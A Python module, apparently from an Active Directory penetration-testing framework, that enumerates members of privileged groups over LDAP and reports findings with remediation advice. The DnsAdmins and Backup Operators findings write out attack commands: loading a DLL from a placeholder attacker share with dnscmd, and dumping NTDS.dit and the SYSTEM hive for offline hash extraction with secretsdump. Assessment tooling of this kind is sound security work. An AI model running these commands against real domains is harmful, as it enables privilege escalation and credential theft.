"""Domain Admin check — enumerate DA members and privileged group members."""
from __future__ import annotations

import sys
import time
from pathlib import Path
from typing import Any

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity
from adforge.core.ldap_client import LdapClient

CVSS_DA_INFO = "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"
CVSS40_DA_INFO = "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"
PRIVILEGED_GROUPS = [
    "Domain Admins",
    "Enterprise Admins",
    "Schema Admins",
    "Administrators",
    "Group Policy Creator Owners",
    "Account Operators",
    "Backup Operators",
    "Print Operators",
    "Server Operators",
    "DnsAdmins",
]


class DaCheck(BaseModule):
    """Privileged group membership enumerator."""

    NAME        = "da_check"
    DESCRIPTION = "Enumerate Domain Admins and other privileged group members"
    PHASE       = 13
    TAGS        = ["post", "domain-admins", "enum", "mitre-T1069.002"]

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        domain = self.config.extra.get("domain", "")
        dc_ip  = self.config.extra.get("dc", self.config.target)

        if not self.check_scope(dc_ip):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        client = LdapClient(
            dc_ip=dc_ip, domain=domain,
            username=self.config.extra.get("username", ""),
            password=self.config.extra.get("password", ""),
        )

        if not client.connect():
            return self._make_result(start)

        try:
            dc_parts = ",".join(f"DC={p}" for p in domain.split("."))
            all_privileged: dict[str, list[str]] = {}

            for group in PRIVILEGED_GROUPS:
                # Build the full group DN — avoid wildcard which is invalid in LDAP DN matching.
                # Most built-in groups live in CN=Users, but DnsAdmins, etc. may be elsewhere.
                # Use memberOf:1.2.840.113556.1.4.1941 (LDAP_MATCHING_RULE_IN_CHAIN) for
                # recursive/nested membership, but first try a direct member query via group DN.
                group_entries = client.search(
                    f"(cn={group})",
                    ["member", "distinguishedName"],
                )
                if not group_entries:
                    continue

                group_dn = str(group_entries[0].get("dn") or group_entries[0].get("distinguishedName") or "")
                if not group_dn:
                    continue

                # Get direct members
                members = client.search(
                    f"(&(objectCategory=person)(objectClass=user)(memberOf={group_dn}))",
                    ["sAMAccountName", "displayName", "adminCount", "lastLogonTimestamp"],
                )
                if members:
                    names = [str(m.get("sAMAccountName") or m.get("displayName") or "?")
                             for m in members]
                    all_privileged[group] = names

            self.config.extra["privileged_groups"] = all_privileged

            # Populate graph nodes/edges for attack_path_svg
            graph_nodes: list[dict] = []
            graph_edges: list[dict] = []
            domain_node_id = f"domain:{domain}"
            graph_nodes.append({"id": domain_node_id, "label": domain, "type": "domain"})

            for group, members in all_privileged.items():
                group_id = f"group:{group}"
                graph_nodes.append({"id": group_id, "label": group, "type": "group"})
                graph_edges.append({"src": group_id, "dst": domain_node_id, "rel": "PartOf"})
                for member in members:
                    user_id = f"user:{member}"
                    if not any(n["id"] == user_id for n in graph_nodes):
                        graph_nodes.append({"id": user_id, "label": member, "type": "user"})
                    graph_edges.append({"src": user_id, "dst": group_id, "rel": "MemberOf"})

            self.config.extra["graph_nodes"] = graph_nodes
            self.config.extra["graph_edges"] = graph_edges

            # --- Findings ---
            da_members = all_privileged.get("Domain Admins", [])
            if len(da_members) > 5:
                self.new_finding(
                    title=f"Excessive Domain Admin Membership ({len(da_members)} members)",
                    severity=Severity.HIGH,
                    description=(
                        f"Domain Admins group has {len(da_members)} members — "
                        "each is a full domain compromise path. "
                        f"Members: {', '.join(da_members[:10])}"
                        + (f" +{len(da_members)-10} more" if len(da_members) > 10 else "")
                    ),
                    reproduction_steps=["Get-ADGroupMember 'Domain Admins' -Recursive"],
                    remediation=(
                        "Reduce DA membership to absolute minimum. "
                        "Use JIT (Just-in-Time) privileged access via PIM. "
                        "Create Tier 0 admin accounts that are ONLY used for DA tasks."
                    ),
                    references=["MITRE T1069.002", "CIS AD Benchmark"],
                    evidence=Evidence(extra={"members": da_members}),
                    cvss_v31_vector=CVSS_DA_INFO,
                    cvss_v40_vector=CVSS40_DA_INFO,
                    mitre_attack=["TA0007/T1069.002"],
                    target=dc_ip,
                )

            # DnsAdmins → privilege escalation via DNS server plugin
            dns_admins = all_privileged.get("DnsAdmins", [])
            if dns_admins:
                self.new_finding(
                    title=f"DnsAdmins Members — Privilege Escalation Path ({len(dns_admins)} users)",
                    severity=Severity.HIGH,
                    description=(
                        f"DnsAdmins group has {len(dns_admins)} member(s): {', '.join(dns_admins[:10])}.\n\n"
                        "DnsAdmins can load an arbitrary DLL into the DNS server process (SYSTEM on DC). "
                        "This is a documented privilege escalation path to SYSTEM/DA.\n\n"
                        "Attack: dnscmd /config /serverlevelplugindll \\\\attacker\\share\\evil.dll"
                    ),
                    reproduction_steps=[
                        "# As DnsAdmins member:",
                        "dnscmd dc.corp.local /config /serverlevelplugindll \\\\attacker\\share\\add_da.dll",
                        "sc stop dns && sc start dns  # reload to execute DLL",
                    ],
                    remediation=(
                        "Remove all non-essential users from DnsAdmins. "
                        "Use Protected Users group for admin accounts. "
                        "Monitor dnscmd usage (Event 770 in DNS debug log)."
                    ),
                    references=["MITRE T1574.002", "https://adsecurity.org/?p=4064"],
                    evidence=Evidence(extra={"dns_admins": dns_admins}),
                    cvss_v31_vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
                    mitre_attack=["TA0004/T1574.002"],
                    target=dc_ip,
                )

            # Backup Operators → can backup SAM, read NTDS.dit
            backup_ops = all_privileged.get("Backup Operators", [])
            if backup_ops:
                self.new_finding(
                    title=f"Backup Operators Members — Hash Dump Path ({len(backup_ops)} users)",
                    severity=Severity.HIGH,
                    description=(
                        f"Backup Operators ({', '.join(backup_ops[:5])}) can backup any file "
                        "including NTDS.dit and SYSTEM hive, enabling full hash extraction. "
                        "Effectively equivalent to DA for credential theft."
                    ),
                    reproduction_steps=[
                        "reg save HKLM\\SYSTEM C:\\temp\\system.hive",
                        "diskshadow /s shadow.dsh  # backup NTDS.dit via VSS",
                        "impacket-secretsdump -system system.hive -ntds ntds.dit LOCAL",
                    ],
                    remediation="Remove all non-essential accounts from Backup Operators.",
                    references=["MITRE T1003.002"],
                    evidence=Evidence(extra={"members": backup_ops}),
                    cvss_v31_vector="CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N",
                    mitre_attack=["TA0006/T1003.002"],
                    target=dc_ip,
                )

            self.log.info("Privileged groups: %s", {g: len(m) for g, m in all_privileged.items()})
        finally:
            client.disconnect()

        return self._make_result(start)


class TestDaCheck:
    def test_privileged_groups(self) -> None:
        assert "Domain Admins" in PRIVILEGED_GROUPS
        assert "Enterprise Admins" in PRIVILEGED_GROUPS
        assert len(PRIVILEGED_GROUPS) >= 8
